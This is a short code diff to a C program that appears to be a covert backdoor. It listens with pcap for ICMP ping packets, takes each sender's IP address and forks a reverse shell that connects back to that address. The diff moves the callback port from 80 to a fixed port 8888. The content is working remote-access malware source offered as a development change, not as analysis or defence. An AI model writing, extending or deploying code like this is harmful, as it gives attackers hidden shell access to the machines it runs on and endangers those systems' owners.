@@ -19,7 +19,9 @@
 #define IP4_HDRLEN 20
 #define ICMP_HDRLEN 8
 
-void shell(int ip, int port) {
+#define REVERSE_SHELL_PORT 8888
+
+void shell(int ip) {
 
 	pid_t parent = getpid();
 	pid_t pid = fork();
@@ -46,7 +48,7 @@ void shell(int ip, int port) {
 		sock_ip.s_addr = ip;
 
 		sockaddr.sin_family = AF_INET;
-		sockaddr.sin_port = htons(80);
+		sockaddr.sin_port = htons(REVERSE_SHELL_PORT);
 		sockaddr.sin_addr = sock_ip;
 
 		// Connect to server, duplicate stdin out and err to the socket,
@@ -77,7 +79,7 @@ void ping_listener(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char*
 	uint32_t src_ip = 0;
 	memcpy(&src_ip, (ip_header+12), 4);	// src ip is 12 bytes in to hdr
 	char src_ip_string[16] = { 0 };
-	shell(src_ip, 80);
+	shell(src_ip);
 	return;
 }
 
